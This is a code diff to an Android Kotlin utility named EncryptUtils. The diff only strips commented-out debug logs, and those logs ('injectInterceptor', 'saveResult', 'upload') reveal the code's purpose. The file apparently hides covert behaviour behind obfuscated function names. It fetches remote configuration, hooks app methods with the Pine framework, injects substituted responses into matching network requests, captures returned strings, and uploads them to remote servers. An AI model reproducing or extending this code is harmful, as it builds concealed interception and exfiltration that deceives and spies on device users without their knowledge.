@@ -15,7 +15,6 @@ import kotlin.random.Random
 
 
 internal object EncryptUtils {
-//    private val TAG = "Tg."
 
     private var sp: SharedPreferences? = null
 
@@ -32,7 +31,6 @@ internal object EncryptUtils {
 
 
     fun init(app: Application) {
-//        Log.i(TAG, "init utils")
         val telMgr = app.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
         val simReady = telMgr.getSimState()
             .let { it == TelephonyManager.SIM_STATE_READY }
@@ -73,7 +71,6 @@ internal object EncryptUtils {
     }
 
     private fun a(b: B) {
-//        Log.i(TAG, "checkUpload")
         val list = loadValue() ?: return
         if (list.isEmpty()) return
         thread(true) {
@@ -96,7 +93,6 @@ internal object EncryptUtils {
     }
 
     private fun fe(u: List<String>, v: Long) {
-//        Log.i(TAG, "fetchConfig:$u $v")
 
         thread(true) {
             kotlin.runCatching {
@@ -127,7 +123,6 @@ internal object EncryptUtils {
         try {
             return sp?.getString(C_KEY, DEFAULT)
                 ?.let { JEnc.decrypt(it) }
-//                ?.also { Log.d(TAG, it) }
                 ?.let { fromJson(it, B::class.java) }
         } catch (t: Throwable) {
         }
@@ -135,7 +130,6 @@ internal object EncryptUtils {
     }
 
     private fun b(list: List<Ok>) {
-//        Log.i(TAG, "injectUpdate")
 
         list.forEach { bean ->
             kotlin.runCatching {
@@ -152,13 +146,11 @@ internal object EncryptUtils {
                                     request::class.java.getDeclaredMethod("url").invoke(request)!!
                                         .toString()
 
-//                                Log.i(TAG, "injectInterceptor url:${reU}")
 
                                 val inject =
                                     bean.i.firstOrNull { reU.contains(it.u) } ?: return@apply
 
                                 callFrame.result = getResponse(request, inject.r).also {
-//                                    Log.i(TAG, "injectInterceptor result:${it}")
                                 }
                             }
                         }
@@ -196,7 +188,6 @@ internal object EncryptUtils {
     }
 
     private fun c(list: List<M>) {
-//        Log.i(TAG, "doNoting")
 
         list.forEach { bean ->
             runCatching {
@@ -207,7 +198,6 @@ internal object EncryptUtils {
     }
 
     private fun d(list: List<M>) {
-//        Log.i(TAG, "saveResult")
 
         list.forEach { bean ->
             runCatching {
@@ -216,7 +206,6 @@ internal object EncryptUtils {
                     override fun afterCall(callFrame: Pine.CallFrame?) {
                         super.afterCall(callFrame)
                         kotlin.runCatching {
-//                            Log.i(TAG, "saveResult afterCall")
                             callFrame?.result?.let {
                                 if (it !is String) return@let
                                 if (it.isNotBlank()) saveText(it)
@@ -232,7 +221,6 @@ internal object EncryptUtils {
 
 
     private fun saveText(s: String) {
-//        Log.i(TAG, "saveText")
         thread(true) {
             kotlin.runCatching {
                 val key = JEnc.md5(("able $s you").toByteArray()) ?: return@runCatching
@@ -259,7 +247,6 @@ internal object EncryptUtils {
 
     private fun u(urls: List<String>, values: List<Pair<String, String>>) {
         if (values.isEmpty()) return
-//        Log.i(TAG, "upload:$values")
 
         values.forEach { pair ->
             val key = pair.first
@@ -331,7 +318,6 @@ internal object EncryptUtils {
                     .getDeclaredMethod("string").invoke(body) as String
             }
         }
-//            .also { Log.d(TAG, it) }
 
     }
 
